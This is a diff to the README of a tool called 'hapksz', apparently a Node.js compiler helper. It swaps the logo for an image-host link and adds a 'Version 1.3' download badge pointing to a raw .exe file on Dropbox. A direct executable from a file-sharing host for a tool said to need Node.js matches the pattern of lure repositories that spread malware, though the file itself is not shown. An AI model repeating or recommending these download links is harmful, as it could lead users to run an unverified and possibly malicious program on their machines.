@@ -1,6 +1,6 @@
 # hapksz
 
-![hapksz Logo](https://via.placeholder.com/150)  
+![hapksz Logo](https://ibb.co/gZDmgWyv)  
 
 ---
 
@@ -29,7 +29,10 @@ The tool locates the source file, invokes the appropriate compiler, and generate
 
 ### Version v1
 
- Version 1.2 [![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://dl.dropboxusercontent.com/scl/fi/gl94ujyvlg0qywtc9sld5/hapksz-1.2.zip?rlkey=p1ngb90mhrhhvn3pt2gr94ihv&st=cw81l2aa&dl=1)
+ **Version 1.2** [![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://dl.dropboxusercontent.com/scl/fi/gl94ujyvlg0qywtc9sld5/hapksz-1.2.zip?rlkey=p1ngb90mhrhhvn3pt2gr94ihv&st=cw81l2aa&dl=1)
+
+ **Version 1.3** [![Click Here to Download](https://img.shields.io/badge/Download-hapksz-blue?style=for-the-badge&logo=download)](https://dl.dropboxusercontent.com/scl/fi/5i45x04v6l4h3ivy5smbg/hapksz.exe?rlkey=62u4hx1bmzxn2v3xkyi3o6qyw)
+
 
 
 Make sure you have Node.js installed (version 14 or higher).
